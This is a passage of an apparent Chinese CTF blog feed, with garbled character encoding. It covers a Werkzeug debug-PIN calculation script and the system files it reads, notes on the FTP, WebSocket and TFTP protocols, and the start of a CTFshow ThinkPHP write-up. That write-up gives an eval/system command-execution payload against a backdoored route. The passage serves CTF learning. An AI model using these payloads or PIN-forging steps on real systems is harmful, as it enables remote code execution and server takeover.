private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ä¹‹éœ€è¦çš„æ–‡ä»¶å°±æ˜¯</p><blockquote><p>/sys/class/net/eth0/address</p><p>/etc/machine-id</p><p>/proc/sys/kernel/random/boot_id</p><p>/proc/self/cgroup</p><p>å¿…è¦çš„å°±æ˜¯machine-idï¼Œæ²¡æœ‰çš„è¯å°±ç”¨boot_idä»£æ›¿</p></blockquote><h2 id="å¥‡æ€ªçš„åè®®"><a href="#å¥‡æ€ªçš„åè®®" class="headerlink" title="å¥‡æ€ªçš„åè®®"></a>å¥‡æ€ªçš„åè®®</h2><p>ä¼—æ‰€å‘¨çŸ¥å•Šï¼Œç°åœ¨ç½‘ç»œä¼ è¾“æœ‰éå¸¸å¤šçš„åè®®ï¼Œæ‰“CTFå‘¢æœ€è¿‘è¶Šæ¥è¶Šæ²¡æœ‰ä»€ä¹ˆæ­£å¸¸çš„httpåè®®äº†ï¼Œæ‰€ä»¥å‡†å¤‡å†™ä¸€ä¸ªå°å°çš„æ–‡ç« ç¨å¾®æ€»ç»“ä¸€ä¸‹å„ç§å¥‡æ€ªåè®®ï¼Œä¸‡ä¸€ä»¥åç”¨çš„åˆ°å‘¢ï½ï½ï½</p><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>FTPåè®®æ˜¯äº’è”ç½‘ä¸Šå¹¿æ³›ä½¿ç”¨çš„æ–‡ä»¶ä¼ è¾“åè®®</p><p>å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å¼ï¼ŒåŸºäºTCPåè®®</p><p>é‡‡ç”¨åŒTCPè¿æ¥æ–¹å¼</p><ul><li>æ§åˆ¶è¿æ¥é»˜è®¤ä½¿ç”¨TCPç«¯å£å·21ï¼Œæ§åˆ¶è¿æ¥åœ¨æ•´ä¸ªä¼šè¯æœŸé—´éƒ½ä¼šä¿æŒæ‰“å¼€</li><li>æ•°æ®è¿æ¥é»˜è®¤ä½¿ç”¨TCPç«¯å£å·20ï¼Œæ•°æ®è¿æ¥åœ¨ä¼ è¾“æ–‡ä»¶æ—¶æ‰“å¼€ï¼Œæ–‡ä»¶ä¼ è¾“ç»“æŸï¼Œè¿æ¥ç»ˆæ­¢</li></ul><p>FTPæœ‰ä¸¤ç§æ–‡ä»¶ä¼ è¾“æ¨¡å¼</p><ul><li>ASCIIæ¨¡å¼æ˜¯é»˜è®¤çš„æ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œä¼šå°†æ–‡ä»¶è½¬ä¸ºæ ‡å‡†ASCIIç å†è¿›è¡Œä¼ è¾“</li><li>äºŒè¿›åˆ¶æ¨¡å¼åˆç§°å›¾åƒæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œæ–‡ä»¶ä¼šæŒ‰ç…§æ¯”ç‰¹æµçš„æ–¹å¼è¿›è¡Œä¼ è¾“</li></ul><p>FTPé‡‡ç”¨ä¸¤ç§æ•°æ®ä¼ è¾“æ–¹å¼</p><ul><li><p>ä¸»åŠ¨ï¼ˆStandardï¼‰æ–¹å¼ï¼Œåˆç§°ä¸ºPORTæ–¹å¼ï¼Œå®¢æˆ·ç«¯é¦–å…ˆå‘æœåŠ¡ç«¯å‘é€PORTå‘½ä»¤ï¼Œå‘Šè¯‰æœåŠ¡å™¨ç”¨äºæ•°æ®ä¼ è¾“çš„ä¸´æ—¶ç«¯å£å·ï¼Œå½“è¿›è¡Œæ•°æ®ä¼ è¾“æ—¶ï¼Œç”±æœåŠ¡å™¨å‘å®¢æˆ·ç«¯æŒ‡å®šç«¯å£å‘èµ·è¿æ¥ï¼Œç”±äºæ˜¯æœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Œæ‰€ä»¥å«ä¸»åŠ¨æ–¹å¼ï¼Œ</p><p>FTPæœåŠ¡å™¨å¿…é¡»å’Œå®¢æˆ·ç«¯å»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥ç”¨æ¥ä¼ é€æ•°æ®ã€‚</p></li><li><p>è¢«åŠ¨ï¼ˆPassiveï¼‰æ–¹å¼ï¼Œåˆç§°ä¸ºPASVæ–¹å¼ï¼ŒæœåŠ¡å™¨æ”¶åˆ°PASVå‘½ä»¤åéšå³æ‰“å¼€ä¸€ä¸ªé«˜ç«¯ï¼ˆå¤§äº1024ï¼‰ç«¯å£ï¼Œå¹¶é€šçŸ¥å®¢æˆ·ç«¯åœ¨è¿™ä¸ªç«¯å£ä¸Šä¼ é€æ•°æ®ï¼Œç”±å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯çš„æŒ‡å®šç«¯å£å‘èµ·è¿æ¥ï¼Œæ‰€ä»¥å«è¢«åŠ¨æ–¹å¼</p><p>FTPæœåŠ¡å™¨ä¸å†éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„è¿æ¥ã€‚</p></li></ul><p>FTPä¸­çš„å‘½ä»¤å’Œåº”ç­”ï¼šå‘½ä»¤å’Œåº”ç­”åœ¨å®¢æˆ·å’ŒæœåŠ¡å™¨çš„æ§åˆ¶è¿æ¥ä¸Šä»¥ NVT ASCIIç å½¢å¼ä¼ é€ã€‚è¿™å°±è¦æ±‚åœ¨æ¯è¡Œç»“å°¾éƒ½è¦è¿”å›C Rã€ L Få¯¹ï¼ˆä¹Ÿå°±æ˜¯æ¯ä¸ªå‘½ä»¤æˆ–æ¯ä¸ªåº”ç­”ï¼‰ã€‚è¿™äº›å‘½ä»¤éƒ½æ˜¯3æˆ–4ä¸ªå­—èŠ‚çš„å¤§å†™ASCIIå­—ç¬¦ï¼Œå…¶ä¸­ä¸€äº›å¸¦é€‰é¡¹å‚æ•°ã€‚ä¸‹é¢æ˜¯ä¸€äº›å‘½ä»¤ï¼ˆæ¥è‡ªå®¢æˆ·ç«¯ï¼‰</p><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ABOR</code></td><td>æ”¾å¼ƒå…ˆå‰çš„FTPå‘½ä»¤ä¸æ•°æ®ä¼ è¾“</td></tr><tr><td><code>LIST filename</code></td><td>åˆ—è¡¨æ˜¾ç¤ºæ–‡ä»¶æˆ–ç›®å½•</td></tr><tr><td><code>USER username</code></td><td>æœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·å</td></tr><tr><td><code>PASS password</code></td><td>æœåŠ¡å™¨ä¸Šçš„å£ä»¤</td></tr><tr><td><code>PORT n1,n2,n3,n4,n5,n6</code></td><td>å®¢æˆ·ç«¯çš„IPåœ°å€ä¸ç«¯å£ï¼ˆn1.n2.n3.n4:n5*256+n6ï¼‰</td></tr><tr><td><code>QUIT</code></td><td>æ³¨é”€</td></tr><tr><td><code>RETR filename</code></td><td>æ£€ç´¢ä¸€ä¸ªæ–‡ä»¶</td></tr><tr><td><code>STOR filename</code></td><td>å­˜å‚¨ä¸€ä¸ªæ–‡ä»¶</td></tr><tr><td><code>SYST</code></td><td>ä»æœåŠ¡å™¨è¿”å›ç³»ç»Ÿç¼–ç ç±»å‹</td></tr><tr><td><code>TYPE typeUSER</code></td><td>è¯´æ˜æ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼šAè¡¨ç¤ºASCIIç ï¼ŒIè¡¨ç¤ºæ¯”ç‰¹æµ</td></tr></tbody></table><p>è€ŒFTPçš„åº”ç­”éƒ½æ˜¯ASCIIç å½¢å¼çš„ä¸‰ä½æ•°å­—ï¼Œå¹¶ä¸”è·Ÿæœ‰æŠ¥æ–‡æ¥å¸®åŠ©äººå·¥å¤„ç†ï¼Œè¿™é‡Œæ˜¯ä¸€äº›æœ‰ç”¨çš„<a href="https://blog.csdn.net/cbffyx/article/details/78891603">å“åº”æ•°æ®</a></p><table><thead><tr><th>åº”ç­”</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>1yz</td><td>è‚¯å®šé¢„å¤‡åº”ç­”ï¼Œåœ¨å‘é€å¦ä¸€ä¸ªå‘½ä»¤å‰æœŸå¾…å¦ä¸€ä¸ªåº”ç­”æ—¶å¯åŠ¨</td></tr><tr><td>2yz</td><td>è‚¯å®šå®Œæˆåº”ç­”ï¼Œä¸€ä¸ªæ–°å‘½ä»¤å¯ä»¥å‘é€</td></tr><tr><td>3yz</td><td>è‚¯å®šä¸­ä»‹åº”ç­”ï¼Œè¯¥å‘½ä»¤å·²è¢«åº”ç­”ï¼Œä½†å¦ä¸€ä¸ªå‘½ä»¤å¿…é¡»è¢«å‘é€</td></tr><tr><td>4yz</td><td>æš‚æ€å¦å®šå®Œæˆåº”ç­”ï¼Œè¯·æ±‚åŠ¨ä½œæœªå‘ç”Ÿï¼Œä½†å·®é”™æ˜¯æš‚æ—¶çš„ï¼Œå‘½ä»¤å¯ä»¥è¿‡åå†å‘</td></tr><tr><td>5yz</td><td>æ°¸ä¹…æ€§å¦å®šå®Œæˆåº”ç­”ï¼Œå‘½ä»¤ä¸è¢«æ¥å—å¹¶ä¸”ä¸å†è¿›è¡Œé‡è¯•</td></tr><tr><td>x0z</td><td>è¯­æ³•é”™è¯¯</td></tr><tr><td>x1z</td><td>ä¿¡æ¯</td></tr><tr><td>x2z</td><td>è¿æ¥ï¼Œåº”ç­”æŒ‡æ§åˆ¶æˆ–æ•°æ®è¿æ¥</td></tr><tr><td>x3z</td><td>é‰´åˆ«å’Œè®°è´¦ï¼Œåº”ç­”ç”¨äºæ³¨å†Œæˆ–è®°è´¦å‘½ä»¤</td></tr><tr><td>x4z</td><td>æœªæŒ‡æ˜</td></tr><tr><td>x5z</td><td>æ–‡ä»¶ç³»ç»ŸçŠ¶æ€</td></tr></tbody></table><p>ä¸‹é¢æ˜¯ä¸€æ¬¡æ­£å¸¸çš„FTPè¿æ¥çš„åŒæ–¹æ•°æ®äº¤äº’çš„è¿‡ç¨‹</p><pre class="line-numbers language-none"><code class="language-none">å“åº”: 220 (vsFTPd 3.0.2)å‘½ä»¤: AUTH TLSå“åº”: 530 Please login with USER and PASS.å‘½ä»¤: AUTH SSLå“åº”: 530 Please login with USER and PASS.çŠ¶æ€: ä¸å®‰å…¨çš„æœåŠ¡å™¨ï¼Œä¸æ”¯æŒ FTP over TLSã€‚å‘½ä»¤: USER testå“åº”: 331 Please specify the password.å‘½ä»¤: PASS ****å“åº”: 230 Login successful.å‘½ä»¤: OPTS UTF8 ONå“åº”: 200 Always in UTF8 mode.å‘½ä»¤: CWD &#x2F;å“åº”: 250 Directory successfully changed.å‘½ä»¤: PWDå“åº”: 257 &quot;&#x2F;&quot;å‘½ä»¤: TYPE Aå“åº”: 200 Switching to ASCII mode.å‘½ä»¤: PASVå“åº”: 227 Entering Passive Mode (172,17,0,6,82,117).å‘½ä»¤: STOR main.pyå“åº”: 150 Ok to send data.å“åº”: 226 Transfer complete.å‘½ä»¤: TYPE Iå“åº”: 200 Switching to Binary mode.å‘½ä»¤: PASVå“åº”: 227 Entering Passive Mode (172,17,0,6,82,111).å‘½ä»¤: LISTå“åº”: 150 Here comes the directory listing.å“åº”: 226 Directory send OK.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WEBSOCKET"><a href="#WEBSOCKET" class="headerlink" title="WEBSOCKET"></a>WEBSOCKET</h3><p>HTTPåè®®æœ‰ä¸€ä¸ªçš„ç¼ºé™·ä¸ºï¼šé€šä¿¡åªèƒ½ç”±å®¢æˆ·ç«¯å‘èµ·ã€‚åœ¨ä¸€äº›åœºæ™¯ä¸‹ï¼Œè¿™ç§å•å‘è¯·æ±‚çš„ç‰¹ç‚¹ï¼Œæ³¨å®šäº†å¦‚æœæœåŠ¡å™¨æœ‰è¿ç»­çš„çŠ¶æ€å˜åŒ–ï¼Œå®¢æˆ·ç«¯è¦è·çŸ¥å°±éå¸¸éº»çƒ¦ã€‚æˆ‘ä»¬åªèƒ½ä½¿ç”¨<a href="https://so.csdn.net/so/search?q=%E8%BD%AE%E8%AF%A2&spm=1001.2101.3001.7020">è½®è¯¢</a>ï¼šæ¯éš”ä¸€æ®µæ—¶å€™ï¼Œå°±å‘å‡ºä¸€ä¸ªè¯¢é—®ï¼Œäº†è§£æœåŠ¡å™¨æœ‰æ²¡æœ‰æ–°çš„ä¿¡æ¯ã€‚è½®è¯¢æ•ˆç‡ä½åˆ‡æµªè´¹èµ„æºï¼Œæ­¤æ—¶ï¼Œwebsocketå°±è¢«å‘æ˜äº†</p><p>Webscoketæ˜¯Webæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¸€ç§å…¨åŒå·¥é€šä¿¡åè®®ï¼Œå…¶ä¸­WebSocketåè®®ç”±IETFå®šä¸ºæ ‡å‡†ï¼ŒWebSocket APIç”±W3Cå®šä¸ºæ ‡å‡†ã€‚ä¸€æ—¦Webå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹èµ·è¿æ¥ï¼Œä¹‹åçš„å…¨éƒ¨æ•°æ®é€šä¿¡éƒ½é€šè¿‡è¿™ä¸ªè¿æ¥è¿›è¡Œã€‚é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œå¯äº’ç›¸å‘é€JSONã€XMLã€HTMLæˆ–å›¾ç‰‡ç­‰ä»»æ„æ ¼å¼çš„æ•°æ®ã€‚</p><p>ä¸HTTPçš„ç›¸åŒç‚¹ï¼š</p><ul><li>éƒ½æ˜¯åŸºäºTCPçš„åº”ç”¨å±‚åè®®</li><li>éƒ½ä½¿ç”¨Request/Responseæ¨¡å‹è¿›è¡Œè¿æ¥çš„å»ºç«‹</li><li>åœ¨è¿æ¥çš„å»ºç«‹è¿‡ç¨‹ä¸­å¯¹é”™è¯¯çš„å¤„ç†æ–¹å¼ç›¸åŒï¼Œåœ¨è¿™ä¸ªé˜¶æ®µWSå¯èƒ½è¿”å›å’ŒHTTPç›¸åŒçš„è¿”å›ç </li></ul><p>ä¸åŒä¹‹å¤„åœ¨äºï¼š</p><ul><li>WSä½¿ç”¨HTTPæ¥å»ºç«‹è¿æ¥ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ç³»åˆ—æ–°çš„headeråŸŸï¼Œè¿™äº›åŸŸåœ¨HTTPä¸­å¹¶ä¸ä¼šä½¿ç”¨</li><li>WSçš„è¿æ¥ä¸èƒ½é€šè¿‡ä¸­é—´äººæ¥è½¬å‘ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªç›´æ¥è¿æ¥</li><li>WSè¿æ¥å»ºç«‹ä¹‹åï¼Œé€šä¿¡åŒæ–¹éƒ½å¯ä»¥åœ¨ä»»ä½•æ—¶åˆ»å‘å¦ä¸€æ–¹å‘é€æ•°æ®</li><li>WSè¿æ¥å»ºç«‹ä¹‹åï¼Œæ•°æ®çš„ä¼ è¾“ä½¿ç”¨å¸§æ¥ä¼ é€’ï¼Œä¸å†éœ€è¦Requestæ¶ˆæ¯</li><li>WSçš„æ•°æ®å¸§æœ‰åº</li></ul><p><img src="https://img-blog.csdnimg.cn/20200527233222508.png" alt="img"></p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªå®Œæ•´çš„websocketçš„è¿‡ç¨‹æ•°æ®æµ</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: localhost:3000Pragma: no-cacheAccept: *&#x2F;*Sec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw&#x3D;&#x3D;Sec-WebSocket-Version: 13Accept-Language: zh-CN,zh-Hans;q&#x3D;0.9Sec-WebSocket-Extensions: permessage-deflateCache-Control: no-cacheAccept-Encoding: gzip, deflateOrigin: nullUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Version&#x2F;15.5 Safari&#x2F;605.1.15Connection: UpgradeUpgrade: websocketHTTP&#x2F;1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL&#x2F;vprw&#x3D;..&quot;c_.Z&gt;.Q..ECHO: xiaosi..&quot;|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...&gt;...5...ECHO: xiaosi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç¬¬ä¸€è¡Œä¸ºä¸ºè¯·æ±‚çš„æ–¹æ³•ï¼Œç±»å‹å¿…é¡»ä¸ºGETï¼Œåè®®ç‰ˆæœ¬å·å¿…é¡»å¤§äº1.1</li><li>Upgradeå­—æ®µå¿…é¡»åŒ…å«ï¼Œå€¼ä¸ºwebsocket</li><li>Connectionå­—æ®µå¿…é¡»åŒ…å«ï¼Œå€¼ä¸ºUpgrade</li><li>Sec-WebSocket-Keyå­—æ®µå¿…é¡»åŒ…å« ï¼Œè®°å½•ç€æ¡æ‰‹è¿‡ç¨‹ä¸­å¿…ä¸å¯å°‘çš„é”®å€¼ã€‚</li><li>Sec-WebSocket-Protocolå­—æ®µå¿…é¡»åŒ…å« ï¼Œè®°å½•ç€ä½¿ç”¨çš„å­åè®®</li></ul><h2 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2><p>TFTP(Trival File Transfer Protocalï¼Œç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰è¯¥åè®®åœ¨ç†ŸçŸ¥ç«¯å£69ä¸Šä½¿ç”¨UDPæœåŠ¡ã€‚TFTPåè®®å¸¸ç”¨äºæ— ç›˜å·¥ä½œç«™æˆ–è·¯ç”±å™¨ä»åˆ«çš„ä¸»æœºä¸Šè·å–å¼•å¯¼é…ç½®æ–‡ä»¶ï¼Œç”±äºTFTPæŠ¥æ–‡æ¯”è¾ƒå°ï¼Œèƒ½å¤Ÿè¿…é€Ÿå¤åˆ¶è¿™äº›æ–‡ä»¶ã€‚</p><p>ä¼˜ç‚¹ï¼šTFTPåè®®ä»£ç æ‰€å ç”¨çš„å†…å­˜å°ï¼Œå…¶å¯¹åº”çš„è½¯ä»¶ä¹Ÿå¾ˆå°ï¼Œæ‰€ä»¥èƒ½ä¸ªå¾ˆå®¹æ˜“åœ°æ”¾å…¥åˆ°æ— ç›˜å·¥ä½œç«™çš„ROMä¸­ï¼ŒTFTPæ”¯æŒASCIIç æˆ–äºŒè¿›åˆ¶ä¼ é€ã€‚</p><p>ä¼ è¾“è¿‡ç¨‹</p><p>ä»¥TFTPå®¢æˆ·å‘TFTPæœåŠ¡å™¨å‘é€è¯»è¯·æ±‚ä¸ºä¾‹ï¼Œè¯´æ˜æ•´ä¸ªè¿‡ç¨‹ã€‚</p><ol><li>æœåŠ¡å™¨ä½¿ç”¨ç†ŸçŸ¥ç«¯å£å·69è¢«åŠ¨æ‰“å¼€è¿æ¥ï¼›</li><li>å®¢æˆ·ä¸»åŠ¨æ‰“å¼€è¿æ¥ï¼Œå®ƒä½¿ç”¨ä¸´æ—¶ç«¯å£ä½œä¸ºæºç«¯å£è€Œç†ŸçŸ¥ç«¯å£69ä½œä¸ºç›®çš„ç«¯å£ï¼Œå‘æœåŠ¡å™¨è¿›ç¨‹å‘é€RRQæŠ¥æ–‡ï¼›</li><li>æœåŠ¡å™¨ä¸»åŠ¨æ‰“å¼€è¿æ¥ï¼Œå®ƒä½¿ç”¨æ–°çš„ä¸´æ—¶ç«¯å£ä½œä¸ºæºç«¯å£ï¼Œè€Œä½¿ç”¨æ”¶åˆ°çš„æ¥è‡ªå®¢æˆ·çš„ä¸´æ—¶ç«¯å£ä½œä¸ºç›®çš„ç«¯å£ï¼Œå‘TFTPå®¢æˆ·è¿›ç¨‹å‘é€DATAæŠ¥æ–‡ï¼ˆ2Bæ“ä½œç ï¼Œ2Bæ•°æ®å—çš„å—å·Kï¼Œ512Bæ•°æ®ï¼‰ï¼›</li><li>å®¢æˆ·æ”¶åˆ°æœåŠ¡å™¨çš„æŠ¥æ–‡åï¼Œå‘é€4Bçš„ACKï¼ˆ2Bçš„æ“ä½œç å’Œ2Bçš„æ•°æ®å—å·ï¼‰ç»™TFTPæœåŠ¡å™¨ï¼Œå‘Šè¯‰å®ƒä¹‹å‰å‘é€ç»™å®¢æˆ·çš„æ•°æ®æŠ¥å·²ç»æ”¶åˆ°ï¼›</li><li>é‡å¤æ­¥éª¤3-4ï¼Œç›´åˆ°æ‰€æœ‰è¯·æ±‚çš„æ•°æ®å‘é€å®Œæ¯•ã€‚</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/2256198-62dba3beb7cb0353.png" alt="img"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowThinkPHPä¸“é¢˜</title>
      <link href="/posts/80a6314c.html"/>
      <url>/posts/80a6314c.html</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><p>ä¸€äº›ThinkPHPçš„åŸºç¡€çŸ¥è¯†ï¼š</p><ol><li><a href="https://www.kancloud.cn/manual/thinkphp/1696">å…³äºThinkPHPçš„æ¨¡å—åŒ–è®¾è®¡</a></li><li><a href="https://www.kancloud.cn/manual/thinkphp/1710">å…³äºThinkPHPçš„é—­åŒ…æ”¯æŒ</a></li></ol><p><strong>569</strong></p><p>çŸ¥é“æ¨¡å—åŒ–è®¾è®¡å°±å¾ˆç®€å•äº†</p><pre class="line-numbers language-none"><code class="language-none">å…¸å‹è®¿é—®è§„åˆ™http:&#x2F;&#x2F;serverName&#x2F;index.phpï¼ˆæˆ–è€…å…¶ä»–åº”ç”¨å…¥å£æ–‡ä»¶ï¼‰&#x2F;æ¨¡å—&#x2F;æ§åˆ¶å™¨&#x2F;æ“ä½œ&#x2F;[å‚æ•°å&#x2F;å‚æ•°å€¼...]&#x2F;index.php&#x2F;Admin&#x2F;Login&#x2F;ctfshowLogin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>570</strong></p><p>é—­åŒ…è·¯ç”±ï¼Œç±»ä¼¼äºå°†/åè·¯å¾„ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè®¾å®šé—­åŒ…è·¯ç”±çš„æ–‡ä»¶åœ¨æ–‡ä»¶æ ¹ç›®å½•/Common/Conf/config.phpä¸­</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token string single-quoted-string">'URL_ROUTER_ON'</span>   <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'URL_ROUTE_RULES'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token string single-quoted-string">'ctfshow/:f/:a'</span> <span class="token operator">=></span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€ä¸ªæ˜æ˜¾çš„åé—¨ï¼Œpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;ctfshow&#x2F;assert&#x2F;eval($_POST[1])POST:1&#x3D;system(&#39;tac &#x2F;*&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>571</strong></p><p>showæ–¹æ³•å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ</p><blockquote><h2 id="æ¸²æŸ“å†…å®¹"><a href="#æ¸²æŸ“å†…å®¹" class="headerlink" title="æ¸²æŸ“å†…å®¹"></a>æ¸²æŸ“å†…å®¹</h2><p>å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•æ¨¡æ¿æ–‡ä»¶ï¼Œæˆ–è€…æŠŠæ¨¡æ¿å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­çš„è¯ï¼Œä½ å°±éœ€è¦ä½¿ç”¨showæ–¹æ³•æ¥æ¸²æŸ“è¾“å‡ºäº†ï¼Œshowæ–¹æ³•çš„è°ƒç”¨æ ¼å¼ï¼š</p><pre class="line-numbers language-none"><code class="language-none">show(&#39;æ¸²æŸ“å†…å®¹&#39;[,&#39;å­—ç¬¦ç¼–ç &#39;][,&#39;è¾“å‡ºç±»å‹&#39;])ä¾‹å¦‚ï¼Œ$this-&gt;show($content);ä¹Ÿå¯ä»¥æŒ‡å®šç¼–ç å’Œç±»å‹ï¼š $this-&gt;show($content, &#39;utf-8&#39;, &#39;text&#x2F;xml&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬å»çœ‹çœ‹showæ–¹æ³•åˆ°åº•æ‰§è¡Œäº†ä»€ä¹ˆ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token 